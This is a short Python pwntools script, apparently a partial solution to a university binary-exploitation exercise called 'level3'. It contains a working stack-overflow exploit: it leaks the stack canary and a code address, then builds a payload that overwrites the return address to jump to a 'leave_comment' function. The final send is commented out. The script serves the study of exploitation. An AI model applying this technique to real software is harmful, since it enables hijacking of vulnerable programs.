from pwn import *

# port = 10006
# rem = remote("kayle.snu.ac.kr", port)
rem = process("./level3/problem/level3")
gdb.attach(rem)

elf = ELF("./level3/problem/level3")
lib = ELF('./level3/problem/libc.so.6')

rem.recvline()

payload = b'A' * 0x49
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))
print(hex(canary))

payload = b'B' * 0x58
rem.send(payload)
rem.recvuntil(payload)
# print(hex(u64(rem.recvn(6) + b'\x00' * 2)))
# print(hex(lib.symbols['__libc_start_main']))
comment_addr = u64(rem.recvn(6) + b'\x00' * 2) - 34 - elf.symbols['main'] + elf.symbols['leave_comment']
print(hex(comment_addr))
# sys_addr = lib_base + lib.symbols['system']
# print(hex(lib_base))

payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(comment_addr)
# rem.recvuntil(b'comment: ')
# rem.send(payload)
# rem.recvline()

# rem.interactive()